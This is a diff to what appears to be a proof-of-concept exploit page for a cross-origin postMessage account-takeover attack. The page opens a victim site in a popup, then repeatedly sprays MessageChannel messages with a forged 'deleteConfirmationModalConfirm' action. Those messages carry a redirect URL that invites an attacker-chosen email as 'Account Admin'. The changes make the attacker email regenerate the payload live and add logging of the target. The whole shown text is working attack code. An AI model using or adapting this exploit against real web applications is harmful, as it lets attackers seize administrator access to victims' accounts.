@@ -77,6 +77,7 @@ function buildRedirect(){
   log('[gen] redirectUrl rebuilt to invite '+email+' as Account Admin');
 }
 document.getElementById('gen').onclick=buildRedirect;
+document.getElementById('attacker').oninput=buildRedirect;  // regenerate live as the email is edited
 buildRedirect();   // populate on load with the default email
 function spray(){ for(const s of SELS){ const ch=new MessageChannel();
   ch.port1.start(); ch.port1.postMessage(payload()); PORTS.push(ch.port1);
@@ -87,9 +88,11 @@ function payload(){ return {action:'deleteConfirmationModalConfirm',
     redirectUrl:document.getElementById('red').value}}; }
 function refire(){ for(const p of PORTS){ try{p.postMessage(payload());}catch(e){} } }
 document.getElementById('go').onclick=()=>{
+  buildRedirect();   // always rebuild from the CURRENT attacker email (Generate is now optional)
   const o=document.getElementById('origin').value.replace(/\/+$/,'');
   const pg=document.getElementById('page').value;
   document.getElementById('log').textContent='idle.'; PORTS.length=0;
+  log('[0] payload targets: '+document.getElementById('attacker').value.trim());
   log('[1] opening victim: '+o+pg);
   w=window.open(o+pg,'c7ato'); if(!w){log('[!] popup blocked — allow popups and retry');return;}
   for(let d=0;d<=6000;d+=20) setTimeout(spray,d);
